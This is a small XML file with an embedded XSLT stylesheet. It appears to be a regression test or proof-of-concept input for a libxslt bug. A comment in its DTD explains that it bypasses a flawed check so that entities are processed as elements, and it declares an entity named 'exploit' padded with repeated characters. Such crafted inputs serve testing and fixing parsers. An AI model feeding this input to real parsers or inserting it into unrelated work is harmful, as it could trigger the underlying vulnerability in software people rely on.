<?xml version="1.0"?>
<!DOCTYPE root [
  <!-- Bypasses an insufficient check in libxslt that only skipped the DTD if
       its first child was an entity. This comment forces the parser to
       descend into the DTD and process entities as elements. -->
  <!ENTITY exploit "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<root xsl:version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xsl:extension-element-prefixes="ext"
      xmlns:ext="http://example.com/ext">
  <xsl:template match="/">
    <html>
      <body>
        <h1>Test</h1>
      </body>
    </html>
  </xsl:template>
</root>
